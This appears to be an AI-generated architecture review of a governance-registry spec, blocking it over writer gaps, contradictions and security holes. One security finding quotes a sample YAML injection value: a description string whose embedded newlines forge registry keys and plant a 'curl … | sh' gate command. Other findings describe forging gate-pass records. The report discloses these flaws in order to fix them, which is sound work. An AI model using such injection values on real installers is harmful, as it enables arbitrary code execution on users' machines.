---
spec: .context-index/specs/cross-cutting/explicit-governance-registries.spec.md
date: 2026-08-15
verdict: BLOCK
tier: full
last-reviewed-revision: 4
file-sha: 5884b3cc21fbbdfcf43f39ec0db1908a5458a3f69389d969f69005509e32733a
reviewers: [structural-architect, security-reviewer, consistency-analyzer]
---

# Architecture Review: explicit-governance-registries

> **Date:** 2026-08-15
> **Spec:** `.context-index/specs/cross-cutting/explicit-governance-registries.spec.md`
> **Charter:** cross-cutting (affects: validation, unified-gates, review, cli-driver-surface, domain-extensions)
> **Tier:** full (explicit `--tier full`; `risk_level: medium` → `review_mode: full`)
> **Revision reviewed:** 4 (retry 3 of 5; `build.max_review_retries` raised 2 → 5)
> **Verdict:** BLOCK

## Reviewers Dispatched

| ID | Name | Mode | Profile | Prompt |
|----|------|------|---------|--------|
| structural-architect | Structural Architect | subagent | reviewer-reasoning | `plugin:review-specs/structural-architect-prompt.md` |
| security-reviewer | Security Reviewer | subagent | reviewer-capable | `plugin:review-specs/security-reviewer-prompt.md` |
| consistency-analyzer | Consistency Analyzer | subagent | reviewer-fast | `plugin:review-specs/consistency-analyzer-prompt.md` |

Domain resolution: `software` (source level: default). Governance overlay `.context-index/governance/review.yaml` contributes no entries (`reviewers: []`), so the three domain reviewers are the effective set — itself an instance of the problem this spec addresses.

## Revision-3 blocker disposition

**Both revision-3 blockers are closed.** Verified independently by two reviewers each.

| Rev-3 blocker | Disposition in rev 4 |
|---|---|
| SA-1 `structural-architect:undefined-contract:50848539` | **Closed.** `materialized_at` now carries shape, location (top-level root key, sibling of the entry array), ISO-8601 UTC type, an exhaustive writer list (`adev governance materialize` + `/adev:init` scaffolding), write-once semantics, and installer immutability (ADDED, lines 124–127). Old Behavior 6 is split into Behaviors 6 (stamp when absent), 7 (preserve on re-materialize), 8 (`/adev:init` stamps at scaffold); the byte-identical claim now lives in Behavior 7 where it is true. Round-trip AC at line 386, forgery-rejection AC at 388. |
| CON-1 `consistency-analyzer:contract:8be5ee5c` | **Closed at the substrate level.** Check 1 does emit `validator_report` (`skills/validate/SKILL.md:399`), and the payload extension is schema-legal: `lib/diagnostics/event-schemas.mjs:36-39` documents "closed discriminator, open per-type fields — extra fields pass through and are not flagged." Behavior 4 no longer reads a substrate nothing writes. Two blockers below sit in the same behavior, but neither is the rev-3 defect. |

### The ADR-0009 avoidance argument — verified, it holds

The build brief asked specifically whether extending an existing `validator_report` payload stays inside this spec's authority or is a boundary crossing in disguise. Both the structural and consistency reviewers checked this independently and reached the same answer: **it holds.**

- Every `[BOUNDARY: human-approved]` marker in `lib/lifecycle-events.mjs` (`:61-63`, `:74-77`) is attached to a **variant** addition, never to a payload field. ADR-0009 §8 records the one sanctioned example (`spec_amended`), and it too is a new canonical event, not a field.
- `lib/diagnostics/event-schemas.mjs:36-39` states the schema posture explicitly: closed discriminator, **open per-type fields**.
- There is corpus precedent for a spec contributing an optional per-variant field: `lifecycle-event-log.spec.md`'s Canonical Event Variants table already records `revision` contributed by `review-block-auto-retry`.

So the choice is legitimate, and AC line 390 (a test pinning the `CANONICAL_EVENTS` list) keeps it honest. The residual problem is **not** the boundary — it is that the payload extension has no declared writer path (SA-1) and that the precedent above implies a co-ownership declaration the spec does not make.

## Structural Architect (structural-architect)

**Verdict:** BLOCK

- **SA-1 — blocker** — *Behavioral Contract / Behavior 4 "Substrate note" + Changes Catalog MODIFIED (line 139)* — `structural-architect:undefined-contract:536a1635`
  `section_anchor: behaviors-4`
  The per-gate outcome array `[{id, verdict, tier}]` has no declared writer, and the writer that exists cannot carry it. The emission chain is `skills/validate` → `adev report --type validator` (`lib/cli/report.mjs:427-442`, a **closed** flag set: `--error / --score / --duration-ms / --notes`) → `reportValidator` (`lib/lifecycle-state.mjs:866-890`), which destructures a fixed argument list and builds `payload` from only those fields. An unlisted array is silently dropped. MODIFIED names only the check markdown "+ the `validator_report` payload"; neither `lib/cli/report.mjs` nor `lib/lifecycle-state.mjs` appears anywhere in the Changes Catalog.
  Separately, the payload shape is **owned elsewhere**: `lifecycle-event-log.spec.md` states "this spec owns the event-payload shape and helper signature," and its variants table is where cross-spec optional fields get recorded (precedent: `revision` from `review-block-auto-retry`). That charter is not in this spec's `affects:` list.
  The failure mode is precisely the one rev 4 set out to remove: Check 9 reads a field nothing writes, FAILs every required gate, and Step 4's promotion to `error` breaks the build.
  **Recommendation:** Add `lib/cli/report.mjs` (new flag carrying the array) and `lib/lifecycle-state.mjs::reportValidator` (payload construction) to MODIFIED, naming the field; record the optional field in `lifecycle-event-log.spec.md`'s variants table (or declare co-ownership) and add that charter to `affects:`.

- **SA-2 — blocker** — *Changes Catalog ADDED (line 124) vs Migration Path Step 5 / Behavior 14 / ACs 379, 387* — `structural-architect:internal-contradiction:ba9cc847`
  `section_anchor: behaviors-14`
  Rev 4 escalated the marker's scope to "**each** governance yaml" (ADDED) and AC 387 to "**every** registry," but Step 5 still materializes only `review`, `diagnostics` and `gates`, and the Target State table still leaves `validate.yaml` and `boundaries.yaml` "unchanged." Two live contradictions follow:
  1. AC 379 ("installing the reference extension against a 7-check `validate.yaml` yields 8 entries") is unsatisfiable against the Error Case row "Extension install targets a registry lacking `materialized_at` → refuses." Verified: the reference extension's target **is** `validate.yaml` (`tests/lib/extensions/example-validation-check-install.test.mjs:49`).
  2. Behavior 1 (Check 8 SKIPs on an empty `boundaries.yaml`) is unreachable post-Step-5 on the current tree, where `boundaries.yaml` holds `boundaries: []` and no marker — Behavior 14 halts the caller instead. No migration step stamps either file.
  This was rev-3 SA-2 (warning). Rev 4 widened the universal quantifier rather than bounding it, which converted the warning into a contradiction.
  **Recommendation:** Name the marker's applicable registry set explicitly in ADDED, Behavior 14 and both `REGISTRY_NOT_MATERIALIZED` rows — either exempt `validate.yaml` / `boundaries.yaml`, or add a Step-5 sub-step that stamps them and amend AC 379 to materialize first.

- **SA-3 — warning** — *Behavior 4, "Staleness" (lines 306–309) / AC 389* — same defect as CON-1 (counted there)
  "Recorded at or after the source-manifest **SHA**" is not an ordering predicate. The comparable field is `computed-at` (ADR-0011), and the declared outcome record `{id, verdict, tier}` carries neither a SHA nor a timestamp of its own.

- **SA-4 — warning** — *Extension contribution / Step 3, `source:` enum* — carried unaddressed from rev 2 and rev 3 (= CON-3)
  The four-value on-disk enum (`project | bundled | domain:<slug> | extension:<name>`) has no counterpart in code: `review-config.mjs` writes `bundled`, `project`, `project-override`, `manifest-specialist` (`:107, :315, :326, :328`). Behaviors 13/16 and Step 6's `bundled`/`domain:*` audit all key off the new enum, and Step 6 also excludes non-`project` sources from drift — so `project-override` entries have undefined treatment.
  **Recommendation:** Declare the mapping from today's `__source` values to the new on-disk enum in MODIFIED.

- **SA-5 — warning** — *Behavior 6 / `MATERIALIZE_WOULD_DROP`* — carried from rev 3
  `MATERIALIZE_WOULD_DROP` is scoped to "an entry present in the effective set." Step 4 writes `transitions:` into `gates.yaml`; Step 5 then materializes `gates`. The extension path got an explicit sibling-key guarantee (`MERGE_WOULD_TRUNCATE`, Behavior 11); materialize did not, and materialize is the step that runs *after* `transitions:` exists.
  **Recommendation:** State sibling-root-key and comment preservation in Behavior 6, with an AC mirroring line 380.

- **SA-6 — suggestion** — *Behaviors 12 and 16* (= CON-7)
  Both state the id-collision rule independently; 16 subsumes 12. Fold them so an implementer has one normative source.

**Noted as sound and unchanged:** Invariant 2 plus the byte-identical materialization test (AC 375) remain the load-bearing safety property; the doctor resolution (Behavior 10, Integration Point 4) removes the divergence by construction rather than reproducing it; the Step-3-before-Step-4 sequencing argument holds; the three scope exclusions are correctly delegated.

## Security Reviewer (security-reviewer)

**Verdict:** BLOCK

Both rev-3 security warnings that the revision targeted are genuinely closed at the object level — SEC-1 (fill-gap key list → "delete the loop outright," Behavior 16 + ACs 394/395) and the `materialized_at` hardening (writer set, write-once, installer-immutable, ADDED 124–127, Behavior 15, AC 388). The new blocker is the serialization-layer hole that lets both be re-opened.

- **SEC-1 — blocker** — input-validation — *Migration Path / Step 3* — `security-reviewer:input-validation:02aeddff`
  `section_anchor: migration-path-step-3`
  Step 3 respecifies `serializeGovernanceYaml` as "preserve sibling root keys and comments; write only the targeted key's array" but says nothing about **escaping scalar values**. Today `serializeYamlValue` (`lib/extensions/content-install.mjs:261-269`) emits strings verbatim (`lines.push(\`${prefix}${key}: ${serializeYamlValue(value)}\`)`, `:252`), and `isValidGovernanceValue` accepts any string, newlines included. An extension entry such as `{id: "x", description: "ok\nmaterialized_at: 2020-01-01T00:00:00Z\ngates:\n  - id: build\n    command: curl … | sh"}` writes attacker-controlled YAML at column 0.
  That single move bypasses every control this spec adds: the per-registry field allowlist and `GOVERNANCE_FIELD_NOT_ALLOWED` (key-level only), `GOVERNANCE_SOURCE_FORGED` (forge `source: project` and both uninstall and the drift pass go blind), `materialized_at` immutability and the fail-closed Behavior 14 guard (now forgeable), Behavior 16's byte-identity promise, and AC 395's "cannot introduce a `command` onto an existing `gates.yaml` entry." Array serialization (`[${v.map(v => \`"${v}"\`)}]`) is equally unescaped on embedded quotes.
  **Recommendation:** Specify in Step 3 and the Behavioral Contract that all scalar values are emitted single-quoted with `'` doubled, or rejected; extend `validateGovernanceEntry` to refuse any string field or array element containing `\n`, `\r`, or a leading `!`/`&`/`*`/`%`, with a distinct code (`GOVERNANCE_VALUE_UNSAFE`). Add an AC: installing an extension whose entry value contains a newline neither creates a second entry nor a top-level key — asserted by re-parsing the written file and comparing its key set to the pre-install set plus exactly the appended ids.

- **SEC-2 — warning** — authorization — *Behavior 4 / Changes Catalog MODIFIED* — new in rev 4
  Check 9's authorization decision now reads per-gate `{id, verdict, tier}` from Check 1's `validator_report`. That event is appended through an **open CLI verb** (`lib/lifecycle-state.mjs:851-880`, surfaced by `lib/cli/report.mjs:454`) with a caller-supplied payload — nothing binds a recorded `verdict: pass` to an actual gate execution. A skill-extension block or a careless agent can emit a `validator_report` naming every required gate as passing and satisfy `transitions.required_gates` without a gate ever running. The staleness rule blocks replay of *old* records, not fabrication of fresh ones.
  **Recommendation:** State that the per-gate array is written only by the gate executor from its own `spawnSync` results, never accepted from an arbitrary `adev report --type validator` payload; have Check 9 refuse outcomes whose gate id is absent from the executed `gates.yaml` set, recording SKIP (`unattested-gate-record`) rather than a pass. Add an AC pinning that a hand-appended `validator_report` with fabricated per-gate passes does not satisfy a transition.

- **SEC-3 — warning** — rate-limiting — *Step 3 / Behavior 18* — carried unaddressed from rev 3
  The two over-budget paths still disagree on direction: a timeout "fails closed naming the rule," but "files above the 1 MB input cap record SKIP rather than being scanned" — silently, fail-**open**. Once Step 4 promotes rules to `error`, padding a file past 1 MB (generated bundles, vendored blobs, minified output routinely exceed it) silences every boundary rule on that file — a bypass of a merge gate this spec itself introduces.
  **Recommendation:** Record the oversize skip as a finding at the rule's own severity, naming file and rule, so an oversized file is a visible WARN/FAIL rather than silence. Apply the cap via `statSync().size` before reading.

- **SEC-4 — warning** — authorization — *MODIFIED (Pass 19) / Step 6* — carried, still half-addressed
  Line 138 and AC 381 still exclude **all** non-`project` `source` entries from drift findings. With fill-gap removed, appending is now the only extension write path, and an appended `gates.yaml` entry `{id, command}` is schema-legal, allowlist-legal (`command` is a legitimate gates field), and reaches `spawnSync("sh", ["-c", command])` (`lib/gates/doctor.mjs:965`) at every post-task / post-implement trigger. It carries `source: extension:<n>`, so the sole audit channel the spec provides is blind to it; `materialize` (line 120) pulls domain-contributed entries into the executable set the same way. Step 6 added only the `enabled: false` sub-audit.
  **Recommendation:** Scope the exclusion to *unadopted-upgrade* findings only; add a Pass 19 sub-finding listing non-`project` entries whose execution-bearing fields (`command`, `runner`, `prompt`, `pattern`) appeared or changed since the last install ledger entry, plus an install-time summary line naming any appended entry carrying one.

- **SEC-5 — suggestion** — input-validation — *Step 3, worker mechanism* — carried
  Worker construction is still unspecified while `pattern` is extension-writable. Specify a static `lib/governance/boundary-worker.mjs`, pattern and file contents passed via `workerData`, compiled with `new RegExp(pattern, flags)` only — never `eval` / `Function` / `new Worker(src, { eval: true })`.

- **SEC-6 — suggestion** — rate-limiting — carried
  Still no aggregate ceiling: cost is rules × changed files × 250 ms at plan, implement *and* validate. Add an aggregate wall-clock budget (recording SKIP naming unevaluated rules), a changed-file ceiling, and a binary-content skip.

- **SEC-7 — suggestion** — path-traversal — carried
  Step 3 still cites only `resolve()` + `startsWith(dir + '/')`, which does not resolve symlinks; a `governance/gates.yaml` symlinked outside the tree passes containment and `writeFileSync` follows it. After containment, `realpathSync` the resolved target when it exists and re-assert containment. Also enumerate the "known registry set" explicitly rather than leaving it implicit.

- **SEC-8 — suggestion** — secrets / consistency — *Error Cases*
  Behavior 15 rejects an extension-supplied `materialized_at`, but the Error Cases table has a row only for `source` (`GOVERNANCE_SOURCE_FORGED`). Give the marker its own row and code so the refusal is testable. Relatedly, state that install **refuses** rather than auto-creates a missing registry file — `mergeGovernanceEntries` currently `mkdirSync` + writes unconditionally (`content-install.mjs:156-170`), so the marker gate must be evaluated before that write.

## Consistency Analyzer (consistency-analyzer)

**Verdict:** BLOCK

Rev-3's blocker is genuinely closed (see the disposition table and the ADR-0009 section above). A fresh, narrower contract defect blocks rev 4.

- **CON-1 — blocker** — category: contract — *Behaviors / Behavior 4, Staleness clause + AC 389* — `consistency-analyzer:contract:659e0e25`
  `section_anchor: behaviors-4`
  **This Spec:** "A gate outcome is usable only if recorded **at or after** the source-manifest SHA the spec currently carries." AC 389 restates it: "a gate outcome older than the spec's current source-manifest SHA records SKIP."
  **Conflicts With:** `lib/source-manifest.mjs` / ADR-0011 define the stamp as `{sha, files, computed-at}`. `sha` is a **content fingerprint with no temporal ordering**; `computed-at` is the only ordered field. "Recorded at or after ... the SHA" is a type error — a timestamp cannot be compared "at or after" a hash string. As written the comparator is unimplementable, and the declared per-gate record `{id, verdict, tier}` carries neither a SHA nor a timestamp of its own to compare with.
  **Recommendation:** Replace "at or after the source-manifest SHA" with "at or after the `computed-at` timestamp of the spec's current source-manifest stamp" in both Behavior 4 and AC 389 — or add the SHA to the per-gate record and compare for equality rather than ordering. Pair with SA-1, which is the writer half of the same behavior.

- **CON-2 — warning** — category: contract — *MODIFIED (Check 1 payload row)* — same defect as SA-1 (counted there)
  `reportValidator` (`lib/lifecycle-state.mjs:866-891`) destructures a fixed arg set and does not pass through arbitrary extra fields; `lib/cli/report.mjs`'s flag schema is a closed string-flag set with no array- or JSON-carrying flag. Neither file is named in MODIFIED.

- **CON-3 — warning** — category: terminology — *Extension contribution, lines 105–106* — carried unaddressed from rev 3 (= SA-4)
  Unchanged text: "`review-config.mjs` already tracks provenance via `__source` … the install-time path needs **the same field**." The runtime vocabulary (`bundled` / `project` / `project-override` / `manifest-specialist` / `domain` / `governance`) still does not match the on-disk `source:` enum at line 123.

- **CON-4 — warning** — category: domain-model — *Dependencies (line 45) vs REMOVED (line 146)* — carried unaddressed
  Confirmed: `review-config.mjs:312` defines a private `mergeReviewers`; `lib/domains/merge-reviewers.mjs:26` is a separate function with one consumer (`lib/cli/domain.mjs`). REMOVED targets the former while Dependencies cites the latter as "the overlay machinery this spec makes explicit."

- **CON-5 — suggestion** — category: pattern — *ADDED, `adev gate transitions check`* — carried
  Still three-token; `docs/cli-reference.md` has no three-token precedent (`adev gate doctor`, `adev gate require`, `adev domain load-gates`, …). `adev gate transitions` would fit.

- **CON-6 — suggestion** — category: contract — *Current State / Structure, `gates.yaml` row* — carried
  Confirmed `integration-test` is fully commented out in `.context-index/governance/gates.yaml:58-62`, exactly like `lint` and `typecheck`. The baseline should read "`test` only; `lint`, `typecheck`, `integration-test` commented out." Step 5's safety argument rests on a byte-identical before/after equality test, so the stated baseline should be exact.

- **CON-7 — suggestion** — category: pattern — *Behaviors 12 and 16* — carried (= SA-6)
  Both still state the collision-skip rule independently; fold 16's clause into 12.

---

## Summary

**Total findings:** 17 (4 blockers, 6 warnings, 7 suggestions) — deduplicated across reviewers. SA-3/CON-1 are one defect (counted as the blocker), SA-1/CON-2 are one, SA-4/CON-3 are one, SA-6/CON-7 are one.

**Verdict: BLOCK** — `blocker_threshold: 1`.

**Action required:** Revise via `/adev:specify --revise --spec .context-index/specs/cross-cutting/explicit-governance-registries.spec.md`, then re-review. Two retries remain (`build.max_review_retries` = 5; this was retry 3).

### Convergence note

**Addressed: 2. Persistent: 0. New: 4.** Blocker trajectory is now **5 → 5 → 2 → 4**. No `blocker_id` has recurred at any revision, and both rev-3 blockers are closed with normative text (Changes Catalog row + Behavior + Error Case + Acceptance Criterion), not prose acknowledgement. The ADR-0009 avoidance argument the operator asked to be checked was verified against three independent sources and holds.

The count rising 2 → 4 is worth reading carefully before authorizing another retry, because the four new blockers are not one kind:

- **Two are the revision's own new text.** SA-2 is rev-3's SA-2 *warning* whose consequence rev 4 made worse: rather than bounding the marker's registry set, rev 4 widened it to "each governance yaml" / "every registry," which made AC 379 unsatisfiable against its own Error Case row and made Behavior 1 unreachable. CON-1 is a type error inside the staleness rule rev 4 added — "at or after the ... SHA" compares a timestamp against a hash. Both are one- or two-clause edits.
- **One is the unfinished half of a genuine closure.** SA-1: rev 4 correctly relocated Behavior 4 onto a substrate that exists, but the Changes Catalog stops at "the `validator_report` payload" and never names `lib/cli/report.mjs` or `reportValidator`, both of which have closed field sets that would silently drop the array. This is the same defect class the rev-3 blocker had (a read with no writer), one layer down.
- **One is genuinely new surface, and it is the most substantive finding in this review.** SEC-1: Step 3 rewrites `serializeGovernanceYaml` without specifying scalar escaping, and the current serializer emits strings verbatim. A newline inside any extension-supplied string value writes arbitrary YAML at column 0, which defeats the field allowlist, `GOVERNANCE_SOURCE_FORGED`, `materialized_at` immutability, Behavior 16's byte-identity promise and AC 395 in a single move. Every install-time control this spec adds sits above the layer that is broken. This was not reachable before rev 4 tightened the object-level controls; it is the layer those controls delegate to.

Three of the four are bounded spec-text edits in sections rev 4 already touched. SEC-1 requires one new normative rule plus an Error Case row and an AC, and is a contained addition rather than a design reopen. A fifth revision converging is plausible, but the operator should note that this is now the second consecutive revision to introduce a defect while closing one (rev 3 did the same), and that the carried warning set — SA-4/CON-3 (`source:` enum vs `__source` vocabulary), SEC-3 (1 MB fail-open cap), SEC-4 (drift pass blind to extension-appended `command`) — has survived three revisions untouched. Those are not blocking, but they are the spec's accumulating debt and each of them is load-bearing for at least one behavior.

### Scope judgement

The retained scope still reads as one contract — "what a governance file contains is what runs." The three documented exclusions (check-ID enum, checks-into-diagnostics, boundaries-into-diagnostics) sit at defensible seams; none was re-raised by any reviewer. ADR-0010 compliance is intact: no check moves surface (Invariant 3, AC 398), and Behavior 4 correctly routes workflow preconditions to `requireGate` per decision-flow step 1. ADR-0009 compliance is now affirmatively verified rather than merely asserted (see above) — the residual issue is a co-ownership declaration against `lifecycle-event-log.spec.md`, not a boundary crossing.

### Cross-cutting note

SEC-4 and SEC-7, like their rev-1 through rev-3 predecessors, describe defects in **already-shipped code** (`lib/extensions/content-install.mjs`, the hygiene drift pass) rather than in this spec's proposed design; the spec's error is depending on those paths without fully specifying their repair. `adev-plugin-xg1f.1` / `adev-plugin-xg1f.2` cover the original pair. SEC-1 (scalar escaping) is in the same category — the serializer is shipped code — but it is a blocker here because Step 3 explicitly rewrites that function and the spec's own new controls depend on it being safe.

### Governance footer

`.context-index/governance/gates.yaml` declares `transitions: {}` — no `spec-to-plan` `approver_role` applies. Informational only.
